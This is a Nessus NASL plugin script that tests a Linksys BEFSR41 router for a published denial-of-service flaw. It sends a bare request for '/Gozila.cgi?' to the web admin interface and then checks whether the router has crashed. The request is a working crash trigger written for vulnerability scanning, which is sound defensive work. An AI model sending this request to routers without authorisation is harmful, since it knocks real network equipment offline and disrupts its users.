# This script was written by Michel Arboi <arboi@alussinan.org>
# GNU Public Licence
#
# References:
#
# From: "David Endler" <dendler@idefense.com>
# To: vulnwatch@vulnwatch.org
# Date: Thu, 31 Oct 2002 21:09:10 -0500
# Subject: iDEFENSE Security Advisory 10.31.02a: Denial of Service Vulnerability in Linksys BEFSR41 EtherFast Cable/DSL Router
# 
# http://www.linksys.com/products/product.asp?prid=20&grid=23
#

if(description)
{
  script_id(11773);
  script_version ("$Revision: 1.3 $");
 
  name["english"] = "Linksys Gozila CGI denial of service";
  script_name(english:name["english"]);
 
  desc["english"] = "
The Linksys BEFSR41 EtherFast Cable/DSL Router crashes
if somebody accesses the Gozila CGI without argument on
the web administration interface.
 
Solution : upgrade your router firmware to 1.42.7.

Risk factor : Medium";


  script_description(english:desc["english"]);    
  summary["english"] = "Request for Gozila.cgi? crashes the Linksys router"; 
  script_summary(english:summary["english"]);
  script_category(ACT_KILL_HOST);
  script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");

  family["english"] = "Denial of Service";
  family["francais"] = "Déni de service";
  script_family(english:family["english"], francais:family["francais"]);
  script_dependencie("find_service.nes");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);
# Maybe we should look into the misc CGI directories?
r = http_get(port: port, item: "/Gozila.cgi?");
send(socket: soc, data: r);
r = http_recv(socket: soc);
http_close_socket(soc);

alive = end_denial();
if (! alive) security_warning(port);
